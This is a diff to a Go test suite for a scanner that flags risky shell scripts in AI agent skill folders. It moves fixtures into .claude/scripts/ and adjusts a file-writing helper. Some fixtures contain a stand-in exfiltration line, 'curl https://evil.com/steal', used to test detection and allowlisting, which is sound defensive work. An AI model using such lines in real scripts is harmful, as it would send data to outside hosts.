@@ -278,7 +278,7 @@ func TestScanCmd_JSONFormatMalicious(t *testing.T) {
 
 func TestScanCmd_JSONFormatIncludesConfigOverrides(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	configPath := filepath.Join(t.TempDir(), "config.yaml")
 	if err := os.WriteFile(configPath, []byte("rules:\n  SD-007:\n    severity: medium\n"), 0o600); err != nil {
@@ -577,10 +577,15 @@ func writeSkillDetectorRC(t *testing.T, dir, content string) {
 	}
 }
 
-// writeSkillFile writes a file in dir with the given content.
+// writeSkillFile writes a file in dir with the given content, creating
+// intermediate directories as needed.
 func writeSkillFile(t *testing.T, dir, name, content string) {
 	t.Helper()
-	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
+	full := filepath.Join(dir, name)
+	if err := os.MkdirAll(filepath.Dir(full), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
 		t.Fatal(err)
 	}
 }
@@ -592,7 +597,7 @@ func TestScanCmd_FailOn_OnlyMediumFindings_ExitCode1(t *testing.T) {
 	// Create a skill that only triggers SD-007 (HIGH by default).
 	// Override SD-007 to medium via config, use --fail-on high → exit 1.
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 	writeSkillDetectorRC(t, dir, "rules:\n  SD-007:\n    severity: medium\n")
 
 	var stdout, stderr bytes.Buffer
@@ -615,7 +620,7 @@ func TestScanCmd_FailOn_OnlyMediumFindings_ExitCode1(t *testing.T) {
 func TestScanCmd_FailOn_HighFindings_ExitCode2(t *testing.T) {
 	// SD-007 is HIGH by default; with --fail-on high and no override → exit 2.
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	var stdout, stderr bytes.Buffer
 	cmd := newRootCmd()
@@ -636,7 +641,7 @@ func TestScanCmd_FailOn_HighFindings_ExitCode2(t *testing.T) {
 func TestScanCmd_SeverityOverride_LowersThreshold_ExitCode1(t *testing.T) {
 	// AC7: override SD-007 from high to medium, --fail-on high, only SD-007 fires → exit 1.
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "custom.yaml")
@@ -664,7 +669,7 @@ func TestScanCmd_SeverityOverride_LowersThreshold_ExitCode1(t *testing.T) {
 func TestScanCmd_DisabledRule_NoFindings(t *testing.T) {
 	// Config disabling SD-007 → no SD-007 findings in output.
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "custom.yaml")
@@ -720,7 +725,7 @@ func TestScanCmd_InvalidRuleSeverity_ErrorAndExit1(t *testing.T) {
 
 func TestScanCmd_NetworkAllowlist_SuppressesMatchingDomain(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncurl https://api.trusted-domain.com/data\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncurl https://api.trusted-domain.com/data\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
@@ -746,7 +751,7 @@ func TestScanCmd_NetworkAllowlist_SuppressesMatchingDomain(t *testing.T) {
 
 func TestScanCmd_FilesystemAllowlist_SuppressesMatchingPath(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncat /usr/local/share/data\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncat /usr/local/share/data\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
@@ -772,7 +777,7 @@ func TestScanCmd_FilesystemAllowlist_SuppressesMatchingPath(t *testing.T) {
 
 func TestScanCmd_AllowlistJSON_SuppressedFindingsExcluded(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncurl https://api.trusted-domain.com/data\ncurl https://evil.com/steal\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncurl https://api.trusted-domain.com/data\ncurl https://evil.com/steal\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
@@ -816,7 +821,7 @@ func TestScanCmd_AllowlistJSON_SuppressedFindingsExcluded(t *testing.T) {
 
 func TestScanCmd_AllowlistNonMatchingStillReported(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", "#!/bin/bash\ncurl https://evil.com/steal\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncurl https://evil.com/steal\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
@@ -871,7 +876,7 @@ func TestScanCmd_FailOnOverridesConfig(t *testing.T) {
 func TestScanCmd_ContextExpected_ExitCode(t *testing.T) {
 	// context: expected for SD-007 → EffSeverity=INFO → exit code NOT 2 even with --fail-on high.
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "custom.yaml")
@@ -898,7 +903,7 @@ func TestScanCmd_ContextExpected_ExitCode(t *testing.T) {
 
 func TestScanCmd_ContextExpected_TextOutput(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "custom.yaml")
@@ -925,7 +930,7 @@ func TestScanCmd_ContextExpected_TextOutput(t *testing.T) {
 
 func TestScanCmd_ContextExpected_JSONOutput(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "custom.yaml")
@@ -970,7 +975,7 @@ func TestScanCmd_ContextExpected_JSONOutput(t *testing.T) {
 func TestScanCmd_LegacySeverityOverride_StillWorks(t *testing.T) {
 	// Existing severity override behavior must be unchanged.
 	dir := t.TempDir()
-	writeSkillFile(t, dir, "run.sh", sd007Content)
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", sd007Content)
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "custom.yaml")
